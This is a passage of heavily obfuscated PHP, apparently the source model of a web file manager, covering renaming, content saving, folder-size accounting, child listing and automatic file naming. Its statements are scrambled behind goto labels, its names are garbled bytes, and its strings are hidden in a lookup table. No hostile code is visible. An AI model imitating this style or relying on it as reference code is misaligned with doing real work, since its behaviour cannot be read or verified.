rename($dçùááÌŸ´, $A¤áôÈÖ†ø) { goto F¿µİ¬“ø; FíŠµù„: $this->setNamePinyin($dçùááÌŸ´, $a–†ãŠé•÷[$Aø¦é®Û¼Ô[28]], !1); $this->updateModifyTime($aŠŠâíÅ£ô[$Aø¦é®Û¼Ô[456]]); $eÔãùàôáÀ = $this->where(array($Aø¦é®Û¼Ô[379] => $dçùááÌŸ´))->data($a–†ãŠé•÷)->save(); goto f‚½òëÆÂ¦; f‚½òëÆÂ¦: $F¤­ˆ«ë— = $Aø¦é®Û¼Ô[2294] . $aŠŠâíÅ£ô[$Aø¦é®Û¼Ô[456]]; if (isset(self::$cacheChildList[$F¤­ˆ«ë—])) { unset(self::$cacheChildList[$F¤­ˆ«ë—]); } return $eÔãùàôáÀ; goto D£Üéá–¾¡; F¿µİ¬“ø: $Aø¦é®Û¼Ô =& $_SERVER[õëù©û]; $aŠŠâíÅ£ô = $this->sourceInfo($dçùááÌŸ´); if (!$aŠŠâíÅ£ô) { return !1; } goto E¢§Ìö•; b…Ÿ¤´£È¹: if (!$aŠŠâíÅ£ô[$Aø¦é®Û¼Ô[366]] == $Aø¦é®Û¼Ô[83]) { $a–†ãŠé•÷[$Aø¦é®Û¼Ô[368]] = get_path_ext($A¤áôÈÖ†ø); } Model($Aø¦é®Û¼Ô[500])->eventRename($dçùááÌŸ´, $aŠŠâíÅ£ô[$Aø¦é®Û¼Ô[28]], $A¤áôÈÖ†ø); $this->sourceCacheClear($dçùááÌŸ´); goto FíŠµù„; E¢§Ìö•: $a˜ ó¢¦ŠÀ = $this->fileNameExist($aŠŠâíÅ£ô[$Aø¦é®Û¼Ô[456]], $A¤áôÈÖ†ø); if ($a˜ ó¢¦ŠÀ) { return !1; } $a–†ãŠé•÷ = array($Aø¦é®Û¼Ô[382] => $A¤áôÈÖ†ø, $Aø¦é®Û¼Ô[519] => USER_ID); goto b…Ÿ¤´£È¹; D£Üéá–¾¡: } public function setNamePinyin($FğâÙ†½â·, $eêœÔÜÛ³Æ, $d‰–ĞíìÛ³ = true) { $EíÛ¨½›§â =& $_SERVER[õëù©û]; $DÁ¸­–›Ê = Input::check($eêœÔÜÛ³Æ, $EíÛ¨½›§â[523]); if ($d‰–ĞíìÛ³ && !$DÁ¸­–›Ê) { return; } if (!$DÁ¸­–›Ê) { $this->metaSet($FğâÙ†½â·, $EíÛ¨½›§â[411], null); $this->metaSet($FğâÙ†½â·, $EíÛ¨½›§â[410], null); return; } $e‘Ü¶íõÚ« = array($EíÛ¨½›§â[411] => str_replace($EíÛ¨½›§â[50], $EíÛ¨½›§â[33], Pinyin::encode($eêœÔÜÛ³Æ)), $EíÛ¨½›§â[410] => Pinyin::encode($eêœÔÜÛ³Æ, $EíÛ¨½›§â[524])); $this->metaSet($FğâÙ†½â·, $e‘Ü¶íõÚ«); } public function getContent($b ù÷£ãæØ) { goto d®Š™¥œÓÁ; eªÄ®À‹éØ: if ($Cà‰îî‰§[$F¿˜ˆàØ÷µ[77]] == 0) { return $F¿˜ˆàØ÷µ[33]; } $c‡©ªè¸¡‡ = $F¿˜ˆàØ÷µ[2313] . $Cà‰îî‰§[$F¿˜ˆàØ÷µ[159]]; if ($Cà‰îî‰§[$F¿˜ˆàØ÷µ[77]] <= 1024 * 10) { $f¾ó‘µ“‚¬ = Cache::get($c‡©ªè¸¡‡); if (!$f¾ó‘µ“‚¬) { $f¾ó‘µ“‚¬ = IO::getContent($Cà‰îî‰§[$F¿˜ˆàØ÷µ[75]]); Cache::set($c‡©ªè¸¡‡, $f¾ó‘µ“‚¬); } return $f¾ó‘µ“‚¬; } goto có“¯æ«íÏ; d®Š™¥œÓÁ: $F¿˜ˆàØ÷µ =& $_SERVER[õëù©û]; $Cà‰îî‰§ = $this->fileInfoGet($b ù÷£ãæØ); if (!$Cà‰îî‰§) { return !1; } goto eªÄ®À‹éØ; có“¯æ«íÏ: return IO::getContent($Cà‰îî‰§[$F¿˜ˆàØ÷µ[75]]); goto C»ÂÓö˜ßã; C»ÂÓö˜ßã: } public function setDesc($e”¿ÕÚëŠÆ, $CğŞ†ìŒÚ) { $Bçôäò÷ˆ =& $_SERVER[õëù©û]; Model($Bçôäò÷ˆ[500])->eventAddDesc($e”¿ÕÚëŠÆ, $CğŞ†ìŒÚ); return $this->metaSet($e”¿ÕÚëŠÆ, $Bçôäò÷ˆ[400], $CğŞ†ìŒÚ); } public function setContent($a¿¡ëÃš‰¼, $Aƒ‡•´±©Â = '') { goto fÒ’ÉÓŒšŠ; DÖ“ÒÊƒÍò: if (!$D¹…±íÅĞ© || !$aÜÔá­ª) { return !1; } $aŞ°‘®’‹¥ = Model($B‚‰œ¾ÑĞ[417])->addFileByContent($Aƒ‡•´±©Â, $aÜÔá­ª[$B‚‰œ¾ÑĞ[28]]); $BŒÏˆÂí÷İ = $this->fileHistory($aÜÔá­ª, $aŞ°‘®’‹¥[$B‚‰œ¾ÑĞ[414]], $aŞ°‘®’‹¥[$B‚‰œ¾ÑĞ[77]]); goto B‚®„·ƒº; B‚®„·ƒº: if (!$BŒÏˆÂí÷İ) { return Model($B‚‰œ¾ÑĞ[417])->remove($aŞ°‘®’‹¥[$B‚‰œ¾ÑĞ[414]]); } $this->folderSizeReset($aÜÔá­ª[$B‚‰œ¾ÑĞ[456]]); return !0; goto Aê…†Ò§; fÒ’ÉÓŒšŠ: $B‚‰œ¾ÑĞ =& $_SERVER[õëù©û]; $aÜÔá­ª = $this->sourceInfo($a¿¡ëÃš‰¼); $D¹…±íÅĞ© = $this->fileInfoGet($a¿¡ëÃš‰¼); goto DÖ“ÒÊƒÍò; Aê…†Ò§: } public function fileSubstr($aÄ‰·óÍ, $Aİ‹»î½”, $Aáô¾÷ÉÓÊ) { $A¾…©£‘¾„ = $this->fileInfoGet($aÄ‰·óÍ); if (!$A¾…©£‘¾„) { return !1; } return IO::fileSubstr($A¾…©£‘¾„[$_SERVER[õëù©û][75]], $Aİ‹»î½”, $Aáô¾÷ÉÓÊ); } public function fileInfoGet($AÑ˜ò³óâ‰) { goto d„¢Î«ç™Ö; d„¢Î«ç™Ö: $CÁ¤·—²î¤ =& $_SERVER[õëù©û]; $dîöí¡óºÕ = $this->sourceInfo($AÑ˜ò³óâ‰); if (!$dîöí¡óºÕ || $dîöí¡óºÕ[$CÁ¤·—²î¤[366]]) { return !1; } goto D¤¾î¶ ­°; D¤¾î¶ ­°: $Eöè¾Çæàè = $CÁ¤·—²î¤[420] . $dîöí¡óºÕ[$CÁ¤·—²î¤[414]]; $f÷­µ“Ñ£ñ = _get(self::$cacheFileInfo, $Eöè¾Çæàè); if ($f÷­µ“Ñ£ñ) { return $f÷­µ“Ñ£ñ; } goto b‚ùò¹ğ™ß; b‚ùò¹ğ™ß: $cĞã˜—·çŠ = Model($CÁ¤·—²î¤[417])->fileInfo($dîöí¡óºÕ[$CÁ¤·—²î¤[414]]); if ($cĞã˜—·çŠ) { $cĞã˜—·çŠ[$CÁ¤·—²î¤[28]] = $dîöí¡óºÕ[$CÁ¤·—²î¤[28]]; } self::$cacheFileInfo[$Eöè¾Çæàè] = $cĞã˜—·çŠ; goto E“¼ò¡Å²£; E“¼ò¡Å²£: return $cĞã˜—·çŠ; goto C¬†îøÎíä; C¬†îøÎíä: } private function folderChildrenNumber($a¸ÚÃ‹åğ) { $E§Â®âœò£ =& $_SERVER[õëù©û]; $EÏ‚ßõİ—Ì = $this->sourceInfo($a¸ÚÃ‹åğ); $E‡ÈÌ›¢ˆ = array($E§Â®âœò£[520] => array($E§Â®âœò£[478], $EÏ‚ßõİ—Ì[$E§Â®âœò£[454]] . $a¸ÚÃ‹åğ . $E§Â®âœò£[479]), $E§Â®âœò£[391] => intval($EÏ‚ßõİ—Ì[$E§Â®âœò£[392]]), $E§Â®âœò£[513] => 1); $Cå›ã…¬ö = $this->where($E‡ÈÌ›¢ˆ)->count(); $bà‰”—Âì = $this->where($E‡ÈÌ›¢ˆ)->where(array($E§Â®âœò£[513] => 0))->count(); return array($E§Â®âœò£[81] => $bà‰”—Âì, $E§Â®âœò£[82] => $Cå›ã…¬ö); } public function pathInfo($BˆÙ¢‘›ôì, $ašÆßâ‡©Ö = false) { goto c¬–††÷ˆë; c¬–††÷ˆë: $D…˜»ëäµæ =& $_SERVER[õëù©û]; $d”Œ•Òîíä = $D…˜»ëäµæ[406] . intval($ašÆßâ‡©Ö) . $D…˜»ëäµæ[407] . $BˆÙ¢‘›ôì; $C©†¦Ô½¢Õ = _get(self::$cachePathInfo, $d”Œ•Òîíä); goto då™õ‚Ü³è; D¦‡Íö¾ŒÆ: $fğ¢¸òã  = $this->_listDataApplyItem($fğ¢¸òã , $ašÆßâ‡©Ö); self::$cachePathInfo[$d”Œ•Òîíä] = $fğ¢¸òã ; return $fğ¢¸òã ; goto f®›ö÷õ©; då™õ‚Ü³è: if ($C©†¦Ô½¢Õ) { return $C©†¦Ô½¢Õ; } $fğ¢¸òã  = $this->sourceInfo($BˆÙ¢‘›ôì); if (!$fğ¢¸òã ) { return !1; } goto D¦‡Íö¾ŒÆ; f®›ö÷õ©: } public static $cachePathInfoMore = array(); public function pathInfoMore($FÀîÊğÏÍ˜) { goto e†‘—Ç´œÕ; e†‘—Ç´œÕ: $f½Òö¦æÓÔ =& $_SERVER[õëù©û]; $fº”âßÂ›ö = _get(self::$cachePathInfoMore, $FÀîÊğÏÍ˜); if ($fº”âßÂ›ö) { return $fº”âßÂ›ö; } goto f¨ä¼°‹ ½; CÉ²•¢ÌŒ‰: self::$cachePathInfoMore[$FÀîÊğÏÍ˜] = $b…ï —‘ë; return $b…ï —‘ë; goto eÆìêÔÕƒ; f¨ä¼°‹ ½: $b…ï —‘ë = $this->pathInfo($FÀîÊğÏÍ˜); if (!$b…ï —‘ë) { return !1; } if ($b…ï —‘ë[$f½Òö¦æÓÔ[366]] == $f½Òö¦æÓÔ[83]) { $b…ï —‘ë[$f½Òö¦æÓÔ[80]] = $this->folderChildrenNumber($FÀîÊğÏÍ˜); } goto CÉ²•¢ÌŒ‰; eÆìêÔÕƒ: } public function sourceInfo($Cº Ù™õç) { goto CíÔ¦ãä‰á; CíÔ¦ãä‰á: $Dà©Èâ‡öÚ =& $_SERVER[õëù©û]; if (!$Cº Ù™õç) { return array(); } $aÅ…¸†éâ† = $Dà©Èâ‡öÚ[405] . $Cº Ù™õç; goto B¥ÌÎ¥°¼÷; B¥ÌÎ¥°¼÷: $E“Ì’š˜ß = _get(self::$cacheSourceInfo, $aÅ…¸†éâ†); if ($E“Ì’š˜ß) { return $E“Ì’š˜ß; } $C’ŠßñêëÍ = $this->where(array($Dà©Èâ‡öÚ[365] => $Cº Ù™õç))->find(); goto BŒ÷›İ˜Ï¤; BŒ÷›İ˜Ï¤: self::$cacheSourceInfo[$aÅ…¸†éâ†] = $C’ŠßñêëÍ; return self::$cacheSourceInfo[$aÅ…¸†éâ†]; goto f«ÆµÃòµ; f«ÆµÃòµ: } public function sourceCacheClear($c‡Ú»çÀÒš = false) { if ($c‡Ú»çÀÒš == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[õëù©û][405] . $c‡Ú»çÀÒš]); } public function pathInfoByPath($BÚ“ø›àè, $dœš“ÌíÖô) { $D’Ü£ä«³ =& $_SERVER[õëù©û]; $BÓŠ’áò‹ = !$dœš“ÌíÖô ? array() : explode($D’Ü£ä«³[8], trim($dœš“ÌíÖô, $D’Ü£ä«³[8])); $f´¤ğ×¥¿ = $BÚ“ø›àè; foreach ($BÓŠ’áò‹ as $B­‹ì˜¬ù˜) { $Aƒ¥Ìå¬Ö = array($D’Ü£ä«³[456] => $f´¤ğ×¥¿, $D’Ü£ä«³[28] => $B­‹ì˜¬ù˜); $Aù³¦ª·†ã = $this->where($Aƒ¥Ìå¬Ö)->select(); if (!$Aù³¦ª·†ã) { return !1; } $Aù³¦ª·†ã = array_sort_by($Aù³¦ª·†ã, $D’Ü£ä«³[392]); $f´¤ğ×¥¿ = $Aù³¦ª·†ã[0][$D’Ü£ä«³[365]]; } return $this->pathInfo($f´¤ğ×¥¿, !0); } protected function updateModifyTime($dÜ°Ãõ£ƒ») { goto EšòšÉÊğ; EšòšÉÊğ: $CÇ™£·ğÄ =& $_SERVER[õëù©û]; if (!$dÜ°Ãõ£ƒ») { return; } if (!is_array($dÜ°Ãõ£ƒ»)) { $dÜ°Ãõ£ƒ» = array($dÜ°Ãõ£ƒ»); } goto dÚ¤ññŠÆ; BÆÅ¶öÏŞ÷: $this->where($e¾ã’¯îÅ)->save($eôÏÅáŸãò); goto cîõŸ÷éùä; dÚ¤ññŠÆ: foreach ($dÜ°Ãõ£ƒ» as $dçÍøİ±„‘ => $DÈ—¸ŞˆË˜) { $dÜ°Ãõ£ƒ»[$dçÍøİ±„‘] = intval($DÈ—¸ŞˆË˜); } $e¾ã’¯îÅ = array($CÇ™£·ğÄ[365] => array($CÇ™£·ğÄ[7], $dÜ°Ãõ£ƒ»)); $eôÏÅáŸãò = array($CÇ™£·ğÄ[519] => USER_ID, $CÇ™£·ğÄ[386] => time()); goto BÆÅ¶öÏŞ÷; cîõŸ÷éùä: } public function folderSizeReset($bØ¸î©«ˆŠ) { goto fäàØ’°½õ; b£áÌØËù‰: $C„æöœïÓö = $this->parentLevelArray($Fø†ÅÅ”¶ä[$b¨ÏÙ¨ÛŸ[454]]); if ($C„æöœïÓö) { $cÅç…›“È = array($b¨ÏÙ¨ÛŸ[365] => array($b¨ÏÙ¨ÛŸ[380], $C„æöœïÓö)); if ($DªÒ­’ÚéÉ < 0) { $cÅç…›“È[$b¨ÏÙ¨ÛŸ[77]] = array($b¨ÏÙ¨ÛŸ[922], abs($DªÒ­’ÚéÉ)); } $this->where($cÅç…›“È)->setAdd($b¨ÏÙ¨ÛŸ[77], $DªÒ­’ÚéÉ); } $this->targetSpaceUpdate($Fø†ÅÅ”¶ä[$b¨ÏÙ¨ÛŸ[367]], $Fø†ÅÅ”¶ä[$b¨ÏÙ¨ÛŸ[451]]); goto C§ùæ¼‰¼; BÏ»‹Ò·¥’: $cÅç…›“È = array($b¨ÏÙ¨ÛŸ[364] => $bØ¸î©«ˆŠ, $b¨ÏÙ¨ÛŸ[391] => 0); $b˜äóÁ©ùÀ = $this->where($cÅç…›“È)->sum($b¨ÏÙ¨ÛŸ[77]); $b˜äóÁ©ùÀ = intval($b˜äóÁ©ùÀ); goto Dí¨‹Ïêéø; dŒëè¼¡ù: CacheLock::lock($BÈ÷ÑˆöÒì, 20); $this->sourceCacheClear($bØ¸î©«ˆŠ); $Fø†ÅÅ”¶ä = $this->sourceInfo($bØ¸î©«ˆŠ); goto BÏ»‹Ò·¥’; fäàØ’°½õ: $b¨ÏÙ¨ÛŸ =& $_SERVER[õëù©û]; if ($this->statusIgnoreResetSpace) { return; } $BÈ÷ÑˆöÒì = $b¨ÏÙ¨ÛŸ[2314] . $bØ¸î©«ˆŠ; goto dŒëè¼¡ù; C§ùæ¼‰¼: CacheLock::unlock($BÈ÷ÑˆöÒì); goto FäğÁŞ÷½Ø; Dí¨‹Ïêéø: $DªÒ­’ÚéÉ = $b˜äóÁ©ùÀ - intval($Fø†ÅÅ”¶ä[$b¨ÏÙ¨ÛŸ[77]]); if ($DªÒ­’ÚéÉ == 0) { return CacheLock::unlock($BÈ÷ÑˆöÒì); } $this->where(array($b¨ÏÙ¨ÛŸ[379] => $bØ¸î©«ˆŠ))->setField($b¨ÏÙ¨ÛŸ[77], $b˜äóÁ©ùÀ); goto b£áÌØËù‰; FäğÁŞ÷½Ø: } public function folderSizeResetChildren($F—‘íØï) { goto aØœ’ºÂĞ®; fËí½ª‘: $eäÀ¿ß—å[$BÑ íİ­ß”[366]] = 0; $E¼‘¿„¾æÀ = $this->field($dËÖÎÎäÏ)->where($eäÀ¿ß—å)->select(); if (!$E¼‘¿„¾æÀ) { return; } goto Fç¦Šíã; E’µ¦¥İ¬©: foreach ($bèÇùª¸õ¥ as $b£“—¬™†é) { if ($b£“—¬™†é[$BÑ íİ­ß”[77]] == $b£“—¬™†é[$BÑ íİ­ß”[2316]]) { continue; } $A‰áà‚¢»£[] = array($BÑ íİ­ß”[365], $b£“—¬™†é[$BÑ íİ­ß”[365]], $BÑ íİ­ß”[77], $b£“—¬™†é[$BÑ íİ­ß”[77]]); } $this->saveAll($A‰áà‚¢»£); goto d×Í°ŠÂå„; a×ğ‰Œ´Ê: foreach ($E¼‘¿„¾æÀ as $b£“—¬™†é) { $eØõ¼Ç³¢Í = $b£“—¬™†é[$BÑ íİ­ß”[456]] . $BÑ íİ­ß”[33]; if (!isset($bèÇùª¸õ¥[$eØõ¼Ç³¢Í])) { continue; } if ($b£“—¬™†é[$BÑ íİ­ß”[392]] == $bèÇùª¸õ¥[$eØõ¼Ç³¢Í][$BÑ íİ­ß”[392]]) { $bèÇùª¸õ¥[$eØõ¼Ç³¢Í][$BÑ íİ­ß”[77]] += $b£“—¬™†é[$BÑ íİ­ß”[77]]; } } foreach ($bèÇùª¸õ¥ as $b£“—¬™†é) { $E«ã¥¼‚Ü = $this->parentLevelArray($b£“—¬™†é[$BÑ íİ­ß”[454]]); foreach ($E«ã¥¼‚Ü as $eØõ¼Ç³¢Í) { $eØõ¼Ç³¢Í = $eØõ¼Ç³¢Í . $BÑ íİ­ß”[33]; if (!isset($bèÇùª¸õ¥[$eØõ¼Ç³¢Í])) { continue; } if ($b£“—¬™†é[$BÑ íİ­ß”[392]] == $bèÇùª¸õ¥[$eØõ¼Ç³¢Í][$BÑ íİ­ß”[392]]) { $bèÇùª¸õ¥[$eØõ¼Ç³¢Í][$BÑ íİ­ß”[77]] += $b£“—¬™†é[$BÑ íİ­ß”[77]]; } } } $A‰áà‚¢»£ = array(); goto E’µ¦¥İ¬©; Fç¦Šíã: $bèÇùª¸õ¥[] = $EŞè§°éÌ; $bèÇùª¸õ¥ = array_to_keyvalue($bèÇùª¸õ¥, $BÑ íİ­ß”[365]); foreach ($bèÇùª¸õ¥ as $c‹Ö…±ã±¼ => $b£“—¬™†é) { $bèÇùª¸õ¥[$c‹Ö…±ã±¼][$BÑ íİ­ß”[2316]] = $bèÇùª¸õ¥[$c‹Ö…±ã±¼][$BÑ íİ­ß”[77]]; $bèÇùª¸õ¥[$c‹Ö…±ã±¼][$BÑ íİ­ß”[77]] = 0; } goto a×ğ‰Œ´Ê; aØœ’ºÂĞ®: $BÑ íİ­ß” =& $_SERVER[õëù©û]; $this->sourceCacheClear($F—‘íØï); $EŞè§°éÌ = $this->sourceInfo($F—‘íØï); goto B£¦°Ğ¬¨; B£¦°Ğ¬¨: $eäÀ¿ß—å = array($BÑ íİ­ß”[513] => 1, $BÑ íİ­ß”[520] => array($BÑ íİ­ß”[478], $EŞè§°éÌ[$BÑ íİ­ß”[454]] . $F—‘íØï . $BÑ íİ­ß”[479])); $dËÖÎÎäÏ = $BÑ íİ­ß”[2315]; $bèÇùª¸õ¥ = $this->field($dËÖÎÎäÏ)->where($eäÀ¿ß—å)->select(); goto fËí½ª‘; d×Í°ŠÂå„: } public function userSpaceReset($dãª–Æ»İ = false) { $b˜„Öâ”Ğ =& $_SERVER[õëù©û]; $A»¡Œ¿Ğ™± = $this->where(array($b˜„Öâ”Ğ[367] => self::TYPE_USER, $b˜„Öâ”Ğ[451] => $dãª–Æ»İ, $b˜„Öâ”Ğ[366] => 0))->sum($b˜„Öâ”Ğ[77]); Model($b˜„Öâ”Ğ[469])->userEdit($dãª–Æ»İ, array($b˜„Öâ”Ğ[2054] => $A»¡Œ¿Ğ™±)); } public function targetSpaceUpdate($EŠÛÍ¬Çª, $CË…”¥µ”ƒ) { $F‘ˆƒĞ™Ëğ =& $_SERVER[õëù©û]; if (!$CË…”¥µ”ƒ) { return; } if (!in_array($EŠÛÍ¬Çª, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $A¼÷µùä¹ = $this->targetSpaceSize($EŠÛÍ¬Çª, $CË…”¥µ”ƒ); if ($EŠÛÍ¬Çª == self::TYPE_USER) { Model($F‘ˆƒĞ™Ëğ[469])->userEdit($CË…”¥µ”ƒ, array($F‘ˆƒĞ™Ëğ[2054] => $A¼÷µùä¹)); } else { if ($EŠÛÍ¬Çª == self::TYPE_GROUP) { Model($F‘ˆƒĞ™Ëğ[453])->groupEdit($CË…”¥µ”ƒ, array($F‘ˆƒĞ™Ëğ[2054] => $A¼÷µùä¹)); } } } public function targetSpaceSize($DğÏ¯„™, $FíÏŠíÀª‰) { goto Eñ…Ò©²; b®ó‘¥Œ Ñ: return $FõÙÛåˆÔÏ; goto C°Ş­¡î«î; b¾‡Õ‘Ö“ƒ: $EŠÖ‘˜Âè¤ = array_to_keyvalue($EŠÖ‘˜Âè¤, $C¼¯î®­—ñ[33], $C¼¯î®­—ñ[365]); $EŠÖ‘˜Âè¤ = array_unique(array_filter($EŠÖ‘˜Âè¤)); if ($EŠÖ‘˜Âè¤) { $eÕ¦»â½„Ï = array($C¼¯î®­—ñ[379] => array($C¼¯î®­—ñ[380], $EŠÖ‘˜Âè¤)); $FõÙÛåˆÔÏ += floatval($this->where($eÕ¦»â½„Ï)->sum($C¼¯î®­—ñ[77])); } goto b®ó‘¥Œ Ñ; Eñ…Ò©²: $C¼¯î®­—ñ =& $_SERVER[õëù©û]; $cª„µ³âÖ… = $this->sourceRoot($DğÏ¯„™, $FíÏŠíÀª‰, !0); if (!$cª„µ³âÖ…) { return 0; } goto a¸™öãì›œ; a¸™öãì›œ: $FõÙÛåˆÔÏ = floatval($cª„µ³âÖ…[$C¼¯î®­—ñ[77]]); $eÕ¦»â½„Ï = array($C¼¯î®­—ñ[520] => array($C¼¯î®­—ñ[478], $C¼¯î®­—ñ[465] . $cª„µ³âÖ…[$C¼¯î®­—ñ[365]] . $C¼¯î®­—ñ[479])); $EŠÖ‘˜Âè¤ = Model($C¼¯î®­—ñ[390])->field($C¼¯î®­—ñ[379])->where($eÕ¦»â½„Ï)->select(); goto b¾‡Õ‘Ö“ƒ; C°Ş­¡î«î: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($fÍŠäÅê—÷) { return $this->fileTypeProfile($fÍŠäÅê—÷, SourceModel::TYPE_USER); } public function groupFileTypeProfile($eš÷ÄÅíæĞ) { return $this->fileTypeProfile($eš÷ÄÅíæĞ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($c´š²åø‹Ú, $eŸìÃÉ‹÷ƒ) { goto dÇ¿Ú•ëºİ; FæÖÂğ¦ñè: $f‚º‰ñƒë‘ = array(); $f‚º‰ñƒë‘[$CÁ”Æ›³[2318]] = array($CÁ”Æ›³[2319] => LNG($CÁ”Æ›³[2318]), $CÁ”Æ›³[2320] => $this->where($AÑ”³…†á)->count(), $CÁ”Æ›³[515] => $this->where($AÑ”³…†á)->sum($CÁ”Æ›³[77])); $fäâ¶áÑµÁ = KodIO::fileTypeList(); goto dˆ¬‹©„ƒ; dˆ¬‹©„ƒ: foreach ($fäâ¶áÑµÁ as $Bæ‘ÁĞ–Š => $C½¤åø÷Æö) { $AÑ”³…†á[$CÁ”Æ›³[368]] = $this->fileTypeWhere($Bæ‘ÁĞ–Š); $f‚º‰ñƒë‘[$Bæ‘ÁĞ–Š] = array($CÁ”Æ›³[2319] => $C½¤åø÷Æö[$CÁ”Æ›³[28]], $CÁ”Æ›³[2320] => $this->where($AÑ”³…†á)->count(), $CÁ”Æ›³[515] => $this->where($AÑ”³…†á)->sum($CÁ”Æ›³[77])); } Cache::set($aÀ¾æ¬É‹, $f‚º‰ñƒë‘, 1200); return $f‚º‰ñƒë‘; goto b¤¼åº‚ô²; dÇ¿Ú•ëºİ: $CÁ”Æ›³ =& $_SERVER[õëù©û]; $aÀ¾æ¬É‹ = $CÁ”Æ›³[2317] . $c´š²åø‹Ú . $CÁ”Æ›³[70] . $eŸìÃÉ‹÷ƒ; $fĞè– ßˆ‰ = Cache::get($aÀ¾æ¬É‹); goto Cáƒ·ƒÃ¨¢; Cáƒ·ƒÃ¨¢: if ($fĞè– ßˆ‰) { return $fĞè– ßˆ‰; } $AÑ”³…†á = array($CÁ”Æ›³[513] => 0); if ($c´š²åø‹Ú != !1) { $AÑ”³…†á[$CÁ”Æ›³[451]] = $c´š²åø‹Ú; $AÑ”³…†á[$CÁ”Æ›³[367]] = $eŸìÃÉ‹÷ƒ; } goto FæÖÂğ¦ñè; b¤¼åº‚ô²: } public function fileNameExist($FöïÊáÙº, $cîçç½‹…Ô) { $fÇ“µ‘‚»‚ =& $_SERVER[õëù©û]; $F ÁÔæ¶³ë = $this->childList($FöïÊáÙº); foreach ($F ÁÔæ¶³ë as $Aƒ¯ ›ÍË) { if ($Aƒ¯ ›ÍË[$fÇ“µ‘‚»‚[28]] == $cîçç½‹…Ô) { return $Aƒ¯ ›ÍË[$fÇ“µ‘‚»‚[365]]; } } return !1; } public function childList($C–ƒàªƒ«à) { goto b»Ô›¹Íé; eóÃåé“Õ: $DÎíàá™Å§ = array($c¶·º×ôß‹[456] => intval($C–ƒàªƒ«à), $c¶·º×ôß‹[392] => 0); $f“…ŸÍ¤Î = $this->where($DÎíàá™Å§)->select(); $f“…ŸÍ¤Î = $f“…ŸÍ¤Î ? $f“…ŸÍ¤Î : array(); goto b¯¨ƒÆ¦Úß; b»Ô›¹Íé: $c¶·º×ôß‹ =& $_SERVER[õëù©û]; $a¨…‰¦Ü®Ò = $c¶·º×ôß‹[2294] . $C–ƒàªƒ«à; if (isset(self::$cacheChildList[$a¨…‰¦Ü®Ò])) { return self::$cacheChildList[$a¨…‰¦Ü®Ò]; } goto eóÃåé“Õ; b¯¨ƒÆ¦Úß: self::$cacheChildList[$a¨…‰¦Ü®Ò] = $f“…ŸÍ¤Î; foreach ($f“…ŸÍ¤Î as $c–ÖÁì±Ï) { $a¨…‰¦Ü®Ò = $c¶·º×ôß‹[405] . $c–ÖÁì±Ï[$c¶·º×ôß‹[365]]; self::$cacheSourceInfo[$a¨…‰¦Ü®Ò] = $c–ÖÁì±Ï; } return $f“…ŸÍ¤Î; goto f›Ñ©ŸéØ; f›Ñ©ŸéØ: } public function fileNameAuto($BŠéÚŠ¾Ñ¹, $BÍ¢ë˜ë×, $cÁ‚Â¶†¢ = REPEAT_RENAME, $Cª‡ö…Åì² = false) { $f´Á¥àì·² =& $_SERVER[õëù©û]; $EÒµİñÏæœ = $this->childList($BŠéÚŠ¾Ñ¹); $c³³¯í«¯Ö = array_to_keyvalue($EÒµİñÏæœ, $f´Á¥àì·²[33], $f´Á¥àì·²[28]); return $this->fileNameAutoGet($c³³¯í«¯Ö, $BÍ¢ë˜ë×, $cÁ‚Â¶†¢, $Cª‡ö…Åì²); } public function fileNameAutoGet($BòíÀÛ³›³, $Bî–ñÚ©¬¥, $fï˜×–Éí, $aé¨´Âá²ô) { $EÙÛÖÅØ‘Ğ =& $_SERVER[õëù©û]; if ($fï˜×–Éí == REPEAT_REPLACE || !$BòíÀÛ³›³ || !in_array_not_case($Bî–ñÚ©¬¥, $BòíÀÛ³›³) || $aé¨´Âá²ô && $fï˜×–Éí != REPEAT_RENAME_FOLDER) { return $Bî–ñÚ©¬¥; } if ($fï˜×–Éí == REPEAT_SKIP) { return !1; } $A‡±ŒÂ† = $EÙÛÖÅØ‘Ğ[91] . get_path_ext($Bî–ñÚ©¬¥); $A‡±ŒÂ† = $A‡±ŒÂ† == $EÙÛÖÅØ‘Ğ[91] || $aé¨´Âá²ô ? $EÙÛÖÅØ‘Ğ[33] : $A‡±ŒÂ†; for ($Eâ­¢ñ§ Å = 1; $Eâ­¢ñ§ Å <= count($BòíÀÛ³›³) + 1; $Eâ­¢ñ§ Å++) { $cÙÂªÚÁÌâ = substr($Bî–ñÚ©¬¥, 0, strlen($Bî–ñÚ©¬¥) - strlen($A‡±ŒÂ†)); $EÚ¾„·é = $cÙÂªÚÁÌâ . "\50{$Eâ­¢ñ§ Å}\x29{$A‡±ŒÂ†}"; if (!in_array_not_case($EÚ¾„·é, $BòíÀÛ³›³)) { return $EÚ¾„·é; } } } } goto F°à³·´¹Ğ; E‰Ïöµ‹êò: class GetInfo { private static $fileTypeArray; public static function get($aÛ™‰…ˆ³î) { $d‡Óˆ†´Ë = IO::info($aÛ™‰…ˆ³î); return self::infoAdd($d‡Óˆ†´Ë); } public static function infoAdd(&$B¼ì¸³¤°) { goto b‘Å¶òÔÔ; b‘Å¶òÔÔ: $eøÉîŸôºË =& $_SERVER[õëù©û]; static $D¸†ÊÒî›ô; if (!$D¸†ÊÒî›ô) { require SDK_DIR . $eøÉîŸôºË[1576]; $D¸†ÊÒî›ô = new getID3(); } goto eÈ‡Éğ¿İÚ; AÚ×ò†Ô: $E½½çÊ»İÇ[$eøÉîŸôºË[368]] = $EœàÔõ³’; $B¼ì¸³¤°[$eøÉîŸôºË[421]] = $E½½çÊ»İÇ; return $B¼ì¸³¤°; goto bï¼Å‡ğ†; aÀ¿àòÔ•è: $EœàÔõ³’ = $B¼ì¸³¤°[$eøÉîŸôºË[156]]; try { if ($B¼ì¸³¤°[$eøÉîŸôºË[156]] == $eøÉîŸôºË[1578]) { $E½½çÊ»İÇ = self::psdParse($e‘·Óáƒ“†); $EœàÔõ³’ = $eøÉîŸôºË[1579]; } else { if ($B¼ì¸³¤°[$eøÉîŸôºË[156]] == $eøÉîŸôºË[1580]) { $E½½çÊ»İÇ = self::pdfParse($e‘·Óáƒ“†); } else { $EœàÔõ³’ = self::$fileTypeArray[$eøÉîŸôºË[1581]][$B¼ì¸³¤°[$eøÉîŸôºË[156]]]; $B™Ó•®¶– = self::$fileTypeArray[$eøÉîŸôºË[1582]][$EœàÔõ³’][$eøÉîŸôºË[1583]]; 